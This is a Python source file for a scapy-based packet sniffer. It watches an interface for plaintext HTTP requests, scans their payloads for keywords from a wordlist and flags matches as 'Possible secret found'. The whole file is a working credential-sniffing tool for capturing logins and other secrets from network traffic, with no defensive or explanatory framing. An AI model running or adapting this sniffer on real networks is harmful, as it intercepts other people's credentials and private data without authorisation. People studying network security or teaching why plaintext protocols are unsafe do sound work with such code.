import scapy.all as scapy
from scapy.layers.http import HTTPRequest
from colorama import Fore, Style, init
import time

init(autoreset=True)

def load_keywords(wordlist_path="default_keywords.txt"):
    keywords = []
    try:
        with open(wordlist_path, 'r') as f:
            for w in f:
                keywords.append(w.strip())
    except FileNotFoundError:
        print(Fore.RED + f"[-] Keyword file not found: {wordlist_path}")
    return keywords

def sniffer(interface, opts):
    wordlist_path = opts.keywords if opts.keywords else "default_keywords.txt"
    keywords = load_keywords(wordlist_path)
    scapy.sniff(store=False, prn=lambda pkt: process_packet(pkt, keywords), iface=interface)

def get_url(pkt):
    try:
        host = pkt[HTTPRequest].Host.decode()
        path = pkt[HTTPRequest].Path.decode()
        url = f"http://{host}{path}"
        return url
    except Exception:
        return ""

def get_info_login(pkt, keywords):
    if pkt.haslayer(scapy.Raw):
        try:
            load = pkt[scapy.Raw].load.decode('utf-8', errors='ignore').lower()
        except:
            return None
        found = False
        for keyword in keywords:
            if keyword in load:
                colored_keyword = Fore.RED + keyword + Style.RESET_ALL
                load = load.replace(keyword, colored_keyword)
                found = True
        if found:
            return load
    return None

def process_packet(pkt, keywords):
    if pkt.haslayer(HTTPRequest):
        url = get_url(pkt)
        
        login_info = get_info_login(pkt, keywords)
        if login_info:
            print(Fore.RED + "\n\n" + "-" * 60)
            print(Fore.RED + f"HTTP Request ==> {url}")
            print(Fore.RED + "-" * 60 + "\n\n")
            print(Fore.GREEN + "[+]!!!! Possible secret found !!! ==> " + Style.RESET_ALL + login_info)
            time.sleep(3)
        if url:
            print(Fore.RED + f"HTTP Request ==> {url}")